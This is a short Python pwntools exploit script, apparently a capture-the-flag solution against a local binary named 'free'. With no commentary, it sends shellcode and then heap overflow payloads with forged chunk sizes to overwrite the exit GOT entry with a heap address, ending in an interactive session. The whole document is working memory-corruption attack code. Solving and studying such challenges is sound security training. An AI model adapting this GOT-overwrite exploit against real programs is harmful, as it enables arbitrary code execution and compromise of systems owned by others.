from pwn import *

p = process("./free")

shellcode = '\xB8\xFB\x85\x04\x08\xFF\xD0'
tricky = 0xfffffffc
offset = 0x168
exit_got = 0x804a024
heap = 0x804b168

payload = shellcode
p.sendline(payload)

payload = 'A'*52 
payload += p32(0x00000065)
p.sendline(payload)

payload = 'A'*100
payload += p32(tricky) + p32(tricky)
payload += p32(exit_got-offset)
payload += p32(heap)
p.sendline(payload)

p.interactive()